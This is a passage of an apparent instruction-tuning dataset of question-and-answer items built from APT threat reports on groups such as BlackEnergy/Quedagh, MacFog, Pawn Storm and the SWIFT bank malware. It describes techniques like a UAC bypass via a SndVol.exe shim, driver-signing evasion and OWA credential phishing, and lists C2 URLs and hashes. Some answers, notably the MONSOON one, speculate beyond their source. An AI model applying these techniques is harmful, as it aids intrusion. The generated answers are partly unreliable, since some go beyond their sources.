sends out the report and exits afterwards. The ShimRatReporter tool was only used to map out the victim but in no way to automate further infection (yet).\n\nAnswer this question based on the above context: How does the Mofang group select its targets, and what are the primary motivations behind these selections?",
    "output": "The Mofang group selects its targets based on their involvement with investments or technological advances that could be perceived as a threat to the Chinese sphere of influence. This is evident in the campaign focusing on Myanmar, where companies involved in special economic zones and government agencies deciding on Chinese investments were targeted. The primary motivation behind these selections appears to be espionage aimed at protecting and advancing Chinese economic and geopolitical interests.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Describe the distribution method and initial infection vector of the MQsTTang backdoor. How do the filenames and hosting method indicate the likely spread mechanism?",
    "output": "MQsTTang is distributed in RAR archives containing a single executable, often with filenames related to diplomacy and passports, such as 'CVs Amb Officer PASSPORT Ministry Of Foreign Affairs.exe'. These archives are hosted on a web server with no associated domain name. The combination of these filenames and the hosting method strongly suggests that the malware is spread via spearphishing. The decoy filenames are designed to entice targets, particularly those involved in political and governmental organizations, to open the malicious attachments.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: UKRAINE-RELATED PROXIES\nWhile examining the samples collected during our BlackEnergy monitoring, we noticed that samples from this year had been updated to support the use of proxy servers while connecting to their C&C servers. This contrasts with earlier BlackEnergy 2 variants, which do not support proxy servers. In some network setups, a proxy server is needed to allow internal users to access the Internet . BlackEnergy\u00b9s use of a proxy server may indicate that the gang has prior knowledge of the target organization's internal setup to note of this requirement.\nFor example, in one sample the configuration uses  the proxy server associated with the Ukrainian Railway (image 6). The configuration from another sample also shows it using an internal proxy under the giknpc domain (image 7). The domain giknpc.com.ua in turn hosts 3 domains (image 8), one of which is for the city of Dnipropetrovsk (image 9), the fourth-largest city in Ukraine, located in the southeast. Based on the set proxy servers for the different samples, we concluded that the gang is targeting Ukrainian government organizations.\nImage 2:\nDecoy document circa 2012\nImage 3:\nStrings from a sample circa 2012\nImage 4:\nDecoy document created using a Russian version of Office\nImage 5:\n2014 dropper sample disguised as a document. The filename means password list\nImage 6:\nConfiguration using Ukrainian Railway's proxy\nImage 7:\nConfiguration using internal proxy under giknpc domain\nBig Headline: TIMELINE\nAlthough they may have started much earlier, the earliest BlackEnergy sample we could attribute to the Quedagh gang is from December 14, 2010.\nInitially, the group seemed to prefer to use the filename of the Windows registry editor (regedt32.exe), presumably because the installer needs administrator rights to install its driver component and therefore would try to request for the highest available rights (image 10), if possible. As this triggers a notification message visible to the user, said user is more likely to grant permission if it appears to be the registry editor that is requesting for permission, since it is normal to run it with administrator rights. Experienced users though are less likely to be taken in, thereby decreasing the likelihood of a successful infection.\nStarting April 2013, modified installers appeared showing that the Quedagh group found a way to bypass the default User Account Control (UAC) settings. With this change, the user's permission is no longer need (image 11). At this point, the gang also began to use the Windows installer program filename msiexec.exe.\nMedium Headline: 64-bit support\nWithin a month of Windows 8.1's release, the gang  had quickly added support for 64-bit systems, possibly anticipating that more of their target systems will be migrated to 64-bit systems. They also employ a neat trick to bypass the driver signing requirement on 64-bit Windows systems. As a side note, this latest finding updates and supercedes previously published research related to BlackEnergy's driver signing behavior .\nHowever, this trick doesn't work on Windows 8 and later systems. The driver also crashes occassionally. This could be the reason for the stand-alone non-persistent BlackEnergy variant.\nMedium Headline: UAC BYPASS DURING INSTALLATION\nThe malware will only attempt to infect a system if the current user is a member of the local administrator group. If not, it will re-launch itself as Administrator on Vista. This in effect will trigger a UAC prompt. On Windows 7 and later however, the malware will attempt to bypass the default UAC settings. It exploits a backward-compatibility feature found in newer versions of Windows. BlackEnergy installers include a Shim Database, or a \"fix\", instructing SndVol.exe to execute cmd.exe (image 15, below) instead in order to resolve the incompatibility.\nSndVol.exe is one of the Windows executables that will be automatically elevated upon execution because it is thought to be safe. What harm can a volume control cause? With the malicious \"fix\" installed however, executing SndVol.exe will execute the not-so-safe file cmd.exe instead, which can then be used to install the malware while in an elevated state.\nMedium Headline: DRIVER SIGNING POLICY BYPASS\nThe role of the installer is to set up the malware's persistent component, which is the driver component. On 64-bit Windows systems, Microsoft has enforced a policy that requires all drivers to be signed as a security precaution. Signing provides a way to identify a driver to its author, effectively reducing the number of malware developers willing to take the risk. To allow developers to test their drivers during development, Microsoft provides a TESTSIGNING boot configuration option; while in this mode, a watermark is displayed on the screen to make it obvious to users and to prevent malware from exploiting this option.\nBlackEnergy enables the TESTSIGNING option to load its driver component; to hide this change from the user, the malware removes the watermark by removing the relevant strings in the user32.dll.mui of the system. In Windows 8 and up however, the strings are no longer stored in user32.dll.mui, so the trick will not work. This may be one of the reasons for the existence of a standalone non-persistent BlackEnergy variant. The malware does not infect 64-bit Windows systems that are older than Vista.\nImage 15: Malicious fix to redirect SndVol.exe to cmd.exe. Inset: Test Mode watermark\nMedium Headline: HIJACKING EXISTING DRIVERS\nThe installer will try to locate an existing driver service that is inactive. The service found will usually be a legitimate one that is disabled because it is no longer used or because it is set to start only on demand. The installer will drop the driver component using the corresponding path of the service.  It will overwrite the existing driver if necessary. The hijacked service is then set to start automatically. This is how the malware is able to survive after a reboot. By doing this, the gang may be hoping that their malicious driver will be overlooked by administrators or investigators who are so used to seeing those legitimate services.\nQuestion: How did the Quedagh gang adapt BlackEnergy to bypass driver signing policies on 64-bit Windows systems, and what limitations did they encounter?",
    "output": "Answer: The Quedagh gang enabled the TESTSIGNING boot configuration option to load BlackEnergy's driver component on 64-bit Windows systems. To hide this change from the user, the malware removed the relevant strings in the user32.dll.mui file to eliminate the watermark indicating test mode. However, this trick does not work on Windows 8 and later systems because the strings are no longer stored in user32.dll.mui. Additionally, the malware does not infect 64-bit Windows systems older than Vista. These limitations may have contributed to the development of a standalone non-persistent BlackEnergy variant. The gang also employed a technique of hijacking existing driver services by locating inactive legitimate services, overwriting their drivers, and setting them to start automatically, thus ensuring persistence after a reboot.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: THE MACFOG BOT DESCRIPTION\nThe MacOS X malware uses the type \"1\" protocol, just as the Windows version of Icefog. It has been distributed on various Internet message boards and forums as an  application called \"Img2icns\". There are two known malicious bundles, one contains the launcher and the backdoor modules, and another contains the dropper and the backdoor modules.\nOnce the user executes the malicious application bundle, the backdoor is copied to the user's directory and the legitimate application is started as if there was no added malicious code.\nSmall Headline: MACFOG \u2014 LAUNCHER MODULE\nThe module is written in Objective C language and contains 4 classes: AppDelegate, UCHostInf, UCNet, UCUpDownload. The latter three classes seem to be included from the backdoor's source code but not used.\nAll functionality is implemented in the function \"AppDelegate - (void) applicationDidFinishLaunching:(id)\".\nThe module was created from the same source code as the dropper but instead of installing the backdoor module, it only executes the malicious payload and the decoy application:\n\"%bundle path%/Contents/Resources/.launchd.app\" \"%bundle path%/Contents/Resources/.Img2icns.app\" (the original \"Img2icns\" application, http://www.img2icnsapp.com/).\nSmall Headline: MACFOG \u2014 DROPPER MODULE\nThe module is written in Objective C language and contains 4 classes: AppDelegate, UCHostInf, UCNet, UCUpDownload. The latter three classes seem to be included from the backdoor's source code but not used.\nAll functionality is implemented in the function \"AppDelegate - (void) applicationDidFinishLaunching:(id)\".\nThe module copies its malicious bundle from \"Contents/Resources/.launchd.app\" to user's home directory  \"/Users/%username%\" and launches it, effectively activating the backdoor. Then, it launches the legitimate part of the bundle, \"Contents/Resources/Img2icns.app\" that is the original \"Img2icns\" application (http://www.img2icnsapp.com/).\nSmall Headline: MACFOG \u2014 BACKDOOR MODULE\nThe module is written in Objective C language and contains 5 classes: AppDelegate, UCHostInf, UCNet, UCUpDownload, KEYLogger.\nThe \"KEYLogger\" class appears to be incomplete. It is only able to get information about active modifier keys and writes data to a log file: \"$HOME/Library/log.log\"\nWhen started, the module launches an application: \"%application's bundle path%/Contents/ Resources/.launchd.app\" This code seems to be reused from the dropper module.\nThen, it proceeds with installation. Once the installation is finished, it starts its main thread (\"UCServerThread\" function) in an infinite loop.\nVery Small Headline: MAIN THRE AD\nThe module retrieves host information and host name and uploads this information to the C2 server. All data sent to the C&C server is encrypted with the hardcoded XOR key \"*&~^%@0hh8979\".\nFirst, it makes a POST request with URL \"hxxp://appst0re.net/upload. aspx?filepath=ok&filename=%hostname%.jpg\". After that, it requests commands from the C&C server. If no data was received, it tries again after sleeping for 120 seconds.\nThe module requests new commands by making a POST request to the C&C server by URL \"hxxp:// appst0re.net/upload.aspx?filepath=order&filename=%hostname%.jpg\" and then executes the command:\nInformation retrieved from the system:\n> host name\n> OS name\n> OS version string\n> process information\n> IP addresses\n> system uptime\n> host date/time\nC&C server: hxxp://appst0re.net\nC&C URLs: hxxp://appst0re.net/upload.aspx?filepath=%order/ok/arbitrary name%&filename=%hostname%.jpg\n\nAnswer this question based on the above context: Explain the communication protocol and encryption method used by the MacFog backdoor module to interact with its Command and Control (C&C) server. What specific information does it retrieve from the system and how does it handle commands from the C&C server?",
    "output": "The MacFog backdoor module communicates with its Command and Control (C&C) server using a specific protocol and encryption method. It uses the type '1' protocol, similar to the Windows version of Icefog. All data sent to the C&C server is encrypted with a hardcoded XOR key, '*&~^%@0hh8979'. Initially, the module makes a POST request to the URL 'hxxp://appst0re.net/upload.aspx?filepath=ok&filename=%hostname%.jpg' to upload host information. Subsequently, it requests commands from the C&C server by making another POST request to 'hxxp://appst0re.net/upload.aspx?filepath=order&filename=%hostname%.jpg'. If no data is received, it retries after sleeping for 120 seconds. The information retrieved from the system includes the host name, OS name, OS version string, process information, IP addresses, system uptime, and host date/time. The C&C server URLs follow the pattern 'hxxp://appst0re.net/upload.aspx?filepath=%order/ok/arbitrary name%&filename=%hostname%.jpg'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How can attackers leverage the Javascript bridge to obtain Android context in Sidewinder Targeted Attacks, and what additional steps might they take to perform actions like taking pictures or recording videos?",
    "output": "Attackers can easily obtain Android context through the Javascript bridge by using code similar to that shown in Listing 4. Operations like taking pictures and recording videos require registering Java callbacks. This can be achieved by either booting a Java VM from the Javascript bridge or injecting code into the host app's Java VM. Additionally, Android Runtime provides a way to load Java Native Interface (JNI) code into the host app using Runtime.load(). Once loaded, the code can obtain context or call DexClassLoader.load() to inject new classes from the attackers' DEX files to register callbacks for taking pictures or recording videos.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Attacks on SWIFT Banking System Benefit From Insider Knowledge\nMay 20,\n2016\nBy on May 20, 2016\nIn recent months, we've seen headlines about the compromise of a bank in Bangladesh from which cybercriminals attempted to steal US$951 million. The malware they used was able to manipulate and read unique messages from SWIFT (Society for Worldwide Interbank Financial Telecommunication), as well as adjust balances and send details to a remote control server. BAE Systems wrote a detailed analysis and concluded that the malware must be based on a framework of different modules that could be used for multiple targets.\nThis week SWIFT sent another warning without details about another bank, this time in Vietnam that was compromised. According to a bank spokesperson, they detected in a timely manner the fraudulent transfer of $1.13 million in December 2015. Because we know the attackers had some insight into the Bangladesh attack, McAfee assumed the attackers also knew something beforehand about the Vietnamese bank. We investigated possible malware indicators for the latter attack.\nFiles used for the investigation:\nMD5: 0b9bf941e2539eaa34756a9e2c0d5343\nMD5: 909e1b840909522fe6ba3d4dfd197d93\nWe focused our analysis primarily on the first sample. The file's compile timestamp is 2015-12-04 02:04:23. The first submission of the file from Vietnam was on December 22, 2015.\nIn the case of the Vietnamese bank, the file used for the attack is a fake version of the popular PDF reader Foxit. The malware installs itself in the original Foxit installation directory and renames the original file to FoxltReader.exe.\nOnce the user starts using the fake reader, the malware executes and writes to a log file in the temp directory C:\\\\Windows\\temp\\\\WRTU\\ldksetup.tmp. Analyzing this file, we see the log data is XOR encoded using the value 0x47.\nAs in the case of the Bangladeshi bank, the malware uses the configuration file Lmutilps32.dat, which can also be found in C:\\\\Windows\\\\temp\\WRTU\\. This file is also XOR encoded, with the value 0x7C4D5978.\nWas this malware part of a targeted attack? Yes, absolutely. As in the malware used against the Bangladeshi bank, we found the SWIFT code for the target in multiple places in the malware:\nThe code TPBVVNVX is the SWIFT code for the Tienphong Commercial Joint Stock Bank, in Hanoi.\nWe also noticed that there were more SWIFT codes in the code:\nThese banks are based in Australia, Singapore, Japan, Korea, Vietnam, Italy, and the United States. We wondered why the actors would put this particular list in the malware. Further analyzing the working of the malware, we discovered an interesting part in the code concerning \"Executing the real Foxit reader\" and the next section in the code states \"PDFmodulation success. \u2026\" This hints of the manipulation of PDF files.\nIn the code, we found that the malware uses the original driver fpdsdk.dll from the Foxit SDK to execute the transformation of the files.\nWe discovered functionality in the code that converts PDF files to XML files, which are stored in the folder C:\\Documents and Settings\\Test\\Local Settings\\Temp\\. The filenames start with XXX or RSP followed by a value between 0-F and finish with the extension .tmp.\nLet's return to our list of SWIFT codes of other banks. The malware reads the SWIFT messages and checks if the sender of the message is one of the listed banks. Once it finds these messages, it reads their information:\nThe malware can manipulate these messages: deleting transactions, transaction history, and system logs, and prevent the printing of the fraudulent transactions:\nAs in the Bangladeshi attack, we found some typos:\nBangladesh: \"fandation\" instead of \"foundation\" and \"alreay\" instead of \"already\"\nVietnam: \"FilleOut\" instead of \"FileOut\"\nDoes this analysis tell us anything about the actors? It might, but these details form a weak indicator. How easy is it to misspell some words on purpose to mislead investigators?\n\nQuestion: What insights can be drawn from the presence of multiple SWIFT codes in the malware used in the Vietnamese bank attack, and how did the malware utilize these codes to manipulate PDF files and SWIFT messages?\n\nAnswer:",
    "output": "The presence of multiple SWIFT codes in the malware used in the Vietnamese bank attack suggests that the malware was designed to target specific banks, including those based in Australia, Singapore, Japan, Korea, Vietnam, Italy, and the United States. The malware utilized these SWIFT codes to read and manipulate SWIFT messages. Specifically, it checked if the sender of a SWIFT message was one of the listed banks and then read their information. The malware also included functionality to convert PDF files to XML files, which were stored in a specific folder. This manipulation involved using the original driver fpdsdk.dll from the Foxit SDK to transform the files. The malware could delete transactions, transaction history, and system logs, and prevent the printing of fraudulent transactions, indicating a sophisticated level of manipulation aimed at covering its tracks and evading detection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: TREND MICRO LEGAL DISCLAIMER\nThe information provided herein is for general information and educational purposes only. It is not intended and should not be construed to constitute legal advice. The information contained herein may not be applicable to all situations and may not reflect the most current situation. Nothing contained herein should be relied on or acted upon without the benefit of legal advice based on the particular facts and circumstances presented and nothing herein should be construed otherwise. Trend Micro reserves the right to modify the contents of this document at any time without prior notice.\nTranslations of any material into other languages are intended solely as a convenience. Translation accuracy is not guaranteed nor implied. If any questions arise related to the accuracy of a translation, please refer to the original language official version of the document. Any discrepancies or differences created in the translation are not binding and have no legal effect for compliance or enforcement purposes.\nAlthough Trend Micro uses reasonable efforts to include accurate and up-to-date information herein, Trend Micro makes no warranties or representations of any kind as to its accuracy, currency, or completeness. You agree that access to and use of and reliance on this document and the content thereof is at your own risk. Trend Micro disclaims all warranties of any kind, express or implied. Neither Trend Micro nor any party involved in creating, producing, or delivering this document shall be liable for any consequence, loss, or damage, including direct, indirect, special, consequential, loss of business profits, or special damages, whatsoever arising out of access to, use of, or inability to use, or in connection with the use of this document, or any errors or omissions in the content thereof. Use of this information constitutes acceptance for use in an \"as is\" condition.\nSmall Headline: Attack Timeline\nThe investigation focused on a group of attacks that has been dubbed \"Operation Pawn Storm\" [6] due to the attackers' use of two or more connected tools/tactics to attack a specific target similar to the chess strategy it was named after. This paper illustrates how the Pawn Storm attacks were carried out with the aid of five spear-phishing emails, which used contextually relevant subjects to get specific targets from different countries to open weaponized attachments designed to compromise their systems.\nTimeline of spear-phishing emails sent to specific targets\nThe attackers sent emails to potential victims, including military, embassy, and defense contractor personnel. The following emails were among those that were found related to this operation:\n\u2022 An email sent to a potential victim from the Ministry of Defense in France had an exploit for CVE-2010-3333 [7] disguised as a document named\n\"International Military.rtf.\" Trend Micro received a sample of this on October 17, 2011 and has been detecting it as TROJ_ARTIEF.AP [8] since then.\n\u2022 An email sent to a potential victim working from the Vatican Embassy in Iraq used reports of a bombing incident [9] that occurred on January 9, 2012 as social engineering lure.\nSEDNIT infectors attached to targeted attack campaign emails\nSent a day after the incident, the email had a Microsoft Word\u00ae file attachment named \"IDF_Spokesperson_Terror_ Attack_011012.doc,\" which exploited CVE-2012-0158 [10].\nExploit for CVE-2012-0158 disguised as a Word (.DOC) file\nSample email sent to recipients from the Vatican Embassy in Iraq\n\u2022 An email sent on September 20, 2013 to military officials from several countries used the then-upcoming \"Asia-Pacific Economic Cooperation (APEC) Indonesia 2013\" conference as bait. The email had two Microsoft Excel\u00ae file attachments named \"APEC Media list 2013 Part1.xls,\" which exploited CVE-2012-0158, and \"APEC Media list 2013 Part2.xls,\" which was nonmalicious.\nSample email sent to military officials across countries using the \"APEC Indonesia 2013\" conference as bait\nExploit for CVE-2012-0158 disguised as an Excel (.XLS) file (APEC Media list 2013 Part1.xls)\n\u2022 An email sent to Pakistani military officials on January 23, 2014 used the \"Homeland Security Summit Middle East\" [11] conference as bait. It had a Word file attachment named \"Details.\ndoc,\" which exploited CVE-2012-0158.\nSample email sent to military officials from Pakistan using the \"Homeland Security Summit Middle East\" conference as bait\n\u2022 An email sent to Polish government employees [12] on August 11, 2014 had a MIME HTML (.MHT) file attachment named \"MH17.doc,\" which exploited CVE-2012-0158.\nExploit for CVE-2012-0158 disguised as a MIME HTML (.MHT) file\nSmall Headline: Attack Details\nAll of the observed Operation Pawn Storm attacks comprised several stages. Each attack had at least two phases:\n\u2022 In phase 1, opening the email attachment displays a decoy document while the exploit runs in the background. The exploit drops a downloader component (.DLL file) named \"netids.dll,\" \"netidt.dll,\" or \"coreshell.dll.\"\n\u2022 In phase 2, the downloader capturing information from infected component communicates with a C&C systems, the keylogger sends data server and downloads a dropper that back to the C&C server. ultimately installs a keylogger. After\nPhases 1 and 2 in an Operation Pawn Storm attack\nWe only managed to collect latter-stage payloads for two out of the six aforementioned attacks. The C&C servers tied to the other four attacks refused to serve the rest of the files to complete the attack chains.\nMultistage attacks are a double-edged sword. If one link in the attack chain, aside from the end node, is detected and removed in the initial infection stage, the entire attack fails. On the other hand, having several links in the attack chain makes detecting the final component more difficult. Tracing the previous and next links is also difficult when any of the components is inspected on its own outside the attack chain.\nAlthough some of the C&C servers were still alive at the time of investigation, they did not respond to our infected systems. Repeated attempts to trick the C&C servers into serving the next files in the incomplete attack chains failed. The attacks they were tied to could be time sensitive and it is possible that they no longer hosted the files for succeeding stages.\nSmall Headline: Attack Evolution\nEven though the filenames used for different components remained fairly consistent from 2010 to the present, earlier attacks were more elaborate and complex compared with those seen this year. The 2014 attacks we have seen were more streamlined.\nComparison of an Operation Pawn Storm attack in 2011 and another in 2014\nAlthough variations in past and current attack chains exist, both are still being used by threat actors to date to ensure one\nthing\u2014detection evasion. The following table compares and contrasts the six Operation Pawn Storm attacks in greater detail.\nSmall Headline: Next-Level Phishing Targets\nThe attackers used specially crafted emails to redirect targets to any of several phishing websites with domain names that were very similar to those of well-known conferences and media outfits. These websites did not host malicious content but visiting them did lead to the automatic execution of a nonmalicious JavaScript. Links to these fake websites were then embedded in spear-phishing emails and sent to selected targets.\nOpening such an email and clicking the link in OWA redirected victims to legitimate websites. The JavaScript made it appear that the victims' OWA sessions ended while at the same time, tricked them into reentering their credentials. To do this, the attackers redirected victims to fake OWA log-in pages by setting their browsers' open windows property. The victims' credentials thus ended up in the attackers' hands.\nNote that two special conditions need to be met for the attacks to succeed\u2014victims should use OWA and click the embedded links via the web portal's preview pane. The attacks worked on any popular browser such as Firefox\u00ae, Safari\u00ae, Chrome\u2122, and Internet Explorer\u00ae. No vulnerabilities need to be exploited for the JavaScript to work.\nBecause many companies allow employees to use webmail services to access their mailboxes while on business travel or at home, these attacks are likely to succeed. Once they do, attackers can gain access to compromised mailboxes that they can then use to gain a foothold in target networks.\nThroughout the course of investigation, several targets have been identified, including:\n\u2022 ACADEMI, formerly Blackwater (United States)\n\u2022 Broadcasting companies in various\ncountries\n\u2022 Military attach\u00e9s from various countries\n\u2022 Ministry of Defense (France)\n\u2022 Ministry of Defense (Hungary)\n\u2022 Multinational company based in Germany\n\u2022 Organization for Security and Cooperation in Europe (OSCE) (Austria)\n\u2022 Pakistani military officials\n\u2022 Polish government employees\n\u2022 SAIC (United States)\n\u2022 U.S. Department of State\n\u2022 Vatican Embassy (Iraq)\nThe following case studies reveal more in-depth details on four specific attacks.\n\nWhat were some of the high-profile targets identified during the investigation of Operation Pawn Storm, and why were these targets particularly significant?",
    "output": "A: During the investigation of Operation Pawn Storm, several high-profile targets were identified, including ACADEMI (formerly Blackwater), broadcasting companies in various countries, military attach\u00e9s from various countries, the Ministry of Defense in France and Hungary, a multinational company based in Germany, the Organization for Security and Cooperation in Europe (OSCE) in Austria, Pakistani military officials, Polish government employees, SAIC in the United States, the U.S. Department of State, and the Vatican Embassy in Iraq. These targets were significant because they represented key military, diplomatic, and corporate entities, making them valuable sources of sensitive information for the attackers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the MONSOON APT campaign utilize DNS information to gather actionable intelligence on its victims?",
    "output": "The MONSOON APT campaign likely utilizes DNS information to gather actionable intelligence on its victims by searching DNS data for information about the victims' internal networks. According to the APT report, the campaign uses a malware component called Unknown Logger, which is capable of spreading itself laterally and downloading second-stage malware. To achieve this, the attackers may query nameservers for the target organization directly or search through centralized repositories of logged DNS query responses, also known as passive DNS. By analyzing DNS misconfigurations or leaks, the attackers may reveal information about the internal networks of their victims, such as registered name servers, subdomains, mail servers, and other hosts. This information can then be used to establish operational resources, gain initial access, or conduct further reconnaissance. For instance, the attackers may use DNS information to identify vulnerabilities in the victims' networks or to create targeted phishing campaigns. Furthermore, the report mentions that the HANGOVER group, which is linked to the MONSOON campaign, has been known to use freelance coders and sell Surveillance-As-A-Service. This suggests that the attackers may also use DNS information to identify potential targets for their surveillance services. Overall, the use of DNS information plays a crucial role in the MONSOON APT campaign, allowing the attackers to gather valuable intelligence on their victims and conduct targeted attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 2. Background\nRori Donaghy3 is a London-based journalist who currently works for UK news organization Middle East Eye, a website that covers news in the Middle East. Middle East Eye has recently published a series of articles about UAE foreign policy, based4 on leaked emails involving members of the UAE government. Previously, Donaghy led the Emirates Center for Human Rights, an organization he founded to \"promote the defence of human rights in the United Arab Emirates through building 5 strong relationships with the media, parliaments and other relevant organisations outside the UAE\". 6\n\nQ: How did Rori Donaghy's work at Middle East Eye potentially attract the attention of advanced persistent threat (APT) groups like Stealth Falcon?",
    "output": "A: Rori Donaghy's work at Middle East Eye involved publishing a series of articles about UAE foreign policy, which were based on leaked emails involving members of the UAE government. This kind of investigative journalism, especially when it exposes sensitive information about a government, can attract the attention of APT groups like Stealth Falcon. These groups may target journalists and organizations to gather intelligence, suppress dissent, or disrupt the dissemination of information that could be damaging to the interests of the entities they are aligned with.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Predictions\nUnderstand how the evolving capabilities of these advanced adversaries will affect you in 2015.\nLooking Forward\nPredicting what will happen in 2015 is a challenge, as unforeseen events will inevitably occur and new TTPs from adversaries across the motivational spectrum will continue to shape the threat environment. Before exploring what may be coming in 2015, a brief look back at the predictions for 2014 is in order.\nLast year, CrowdStrike made a number of predictions about the 2014 threat landscape, many of which came to fruition:\n\u2022 North Korean Activity \u2013 CrowdStrike Intelligence predicted that North Korea might use its cyber operations to project power during 2014. This prediction came to fruition at the end of 2014 when a North Korean adversary attacked Sony because of one of the studio's movies that North Korea perceived as an act of war.\n\u2022 windows XP End of life \u2013 Targeted attackers did use exploits such CVe-2014-1776 to target out-of-life Windows XP machines. This continues to be a significant risk, as the existence of legacy Windows XP machines continues to expose an attack surface.\n\u2022 Third-Party Targeting \u2013 2013 saw actors targeting third-party vendors offering DNS, social media, and content management services in order to attack customers of those services. As one example, CrowdStrike observed a number of attacks by the HURRICANe PANDA adversary against DNS and hosting providers in 2014; these attacks were highly likely used to ultimately target those providers' customers.\n\u2022 Sandbox-Aware Malware \u2013 The use of sandbox-aware malware was not new to 2014, but adversaries did make significant use of malware variants capable of detecting if they were being run in sandbox environments. These techniques ranged from detection of sandboxes through system and network artifacts, detection of user activity, and even prompting user interaction as a countermeasure.\nLooking Forward\n\u2022 Use of High-Level Languages \u2013 The 2014 yearly report noted a downward trend in the use of low-level languages like C and a growing trend in the use of high-level languages like C# and Python. During 2014, CrowdStrike did observe several adversaries such as VICeROy TIGeR making heavy use of a malware variant that primarily leveraged Python script.\n\u2022 Activity in the Physical World \u2013 Physical world conflict often leads to related cyber operations, and 2014 was no different. A number of conflicts in the physical space such as those in the South China Sea, Ukraine, and the Middle east all resulted in related cyber operations by targeted intrusion adversaries in China, Russia, and Iran, as well as nationalist and hacktivist actors.\n2015 will undoubtedly hold many surprises and new developments in the realm of computer security. The following section contains estimative judgments about what may be likely trends or occurrences in the next year.\nSmall Headline: RESEARCH AND DEvElOPmENT\nResearch and development during one year can often set the expectations and direction of the next. With this in mind, the CrowdStrike Intelligence team carefully observed patterns and trends in the security research community. Based on the trends of 2014, the following estimates were developed:\n\u2022 It is expected that Let's Encrypt, the first free certificate authority with a pre-installed root certificate in major browsers, will launch in 2015. This service will offer very simple command line provisioning of certificates for use in HTTPS. As a result of the ease of use and availability, it is likely that an increasing amount of Internet traffic will be encrypted. As HTTP traffic becomes less common, it is more likely to be suspect and subject to closer inspection. This opens the possibility that more adversaries may look to leverage SSL certificates for command and control. Additionally, Content Security Policy (CSP) for webpages means that XSS-attacks will become more complicated to mount. In 2015, it is expected that\nLooking Forward\ntwo-factor authentication will be more widely deployed across enterprise and cloud services, which will hopefully hamper the effectiveness of credential and banking phishing operations.\n\u2022 Adversaries are constantly advancing their capabilities; overseas, cryptography and its application has continued to dominate the technology news, beginning with revelations from the Snowden leaks. CrowdStrike assesses it is possible that adversaries will deploy more sophisticated encryption and key agreement schemes to hamper interception by security professionals and intelligence services.\n\u2022 In 2015, a number of sandboxes using hypervisor introspection will become available, both commercially and in open source. Introspection allows a sandbox to instrument a virtual machine through the hypervisor; this provides additional stealth to the sandbox, allowing it to avoid detection. It remains to be seen whether malware authors will completely cease their efforts to detect traditional sandboxing solution and/or whether they will try to subvert introspection-based sandboxes. Given the difficulty in detection, and the speed at which new technologies are adopted, it is likely that adversaries will continue to detect traditional sandboxes in 2015, with more advanced adversaries exploring techniques to identify or evade introspection-based systems.\n\u2022 Embedded devices, regardless of whether they are home routers or industrial control systems, will be increasingly targeted. One of the primary factors impacting this belief is the increasing pace of vulnerability disclosures in the embedded space and in the underlying software they leverage. The increasing prevalence and popularity of Internet of Things (IoT) devices, discussed in more detail below, is another factor in this likely targeting. This targeting will likely occur across a variety of threat actors. In 2014, we saw the compromise  of home router technology used to build an embedded proxy layer used to mask the identity of the attacker.\nLooking Forward\n\u2022 Internet of Things (IoT) devices are still in their infancy and the concept of IoT has not yet become widely adopted or even available to the average end user. There are, however, a large number of devices being sold already that would fit under the IoT umbrella, even if they do not make use of the IoT communication standards. While targeted attacks against IoT devices are unlikely at this time, the potential to abuse IoT devices for amplified DDOS as well as disrupting IoT networks through DOS'ing of central control infrastructure might well be possible.\n\nQ: Why are embedded devices and Internet of Things (IoT) devices expected to become increasingly targeted by various threat actors in 2015?",
    "output": "A: Embedded devices and IoT devices are expected to become increasingly targeted due to the rising pace of vulnerability disclosures in the embedded space and the underlying software they use. The growing prevalence and popularity of IoT devices also contribute to this trend. Threat actors may exploit these devices to create embedded proxy layers, mask their identities, or conduct amplified DDoS attacks. Additionally, disrupting IoT networks through denial-of-service attacks on central control infrastructure is a potential threat vector.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does North Korea employ kidnapping and psychological conditioning of foreign citizens to enhance its intelligence capabilities, and what specific examples illustrate this practice?",
    "output": "North Korea kidnaps foreign citizens and uses them as instruments for intelligence after subjecting them to torture and psychological conditioning. These individuals are then utilized based on their skillsets, such as teaching languages, spreading propaganda, providing translation services, or conducting military training. In July 2014, Japanese officials agreed to lift some sanctions on North Korea in exchange for the regime investigating the whereabouts of Japanese citizens allegedly abducted decades ago. This highlights the regime's strategy of using kidnapped individuals to further its intelligence and political goals.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Thamar Reservoir campaign utilize multi-stage malware to compromise its targets? Describe the process from the initial infection vector to the installation of the CWoolger Keylogger.",
    "output": "The Thamar Reservoir campaign utilizes a multi-stage malware approach to compromise its targets. The initial infection vector is a malicious Excel file that serves as a Dropper. When the Excel file is opened, the user sees a blank sheet and a standard 'Macros have been disabled' message. If macros are enabled, the macro drops two files: NTUSER.dat{GUID}.exe and tmp.bat. Different malware can be downloaded to the infected computer. In one analyzed case, the CWoolger Keylogger was found. The keylogger's executable file is located in %appdata%\\microsoft\\windows\\templates\\wlg.exe, and it gains persistence by placing a link in the Startup folder disguised as 'WinDefender' with the Notepad icon. Collected keystrokes are saved in %temp% in a file called wlg.dat and sent to an attacker-controlled server every 15 minutes.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Darkhotel APT group utilize brute force techniques in their attack campaigns?",
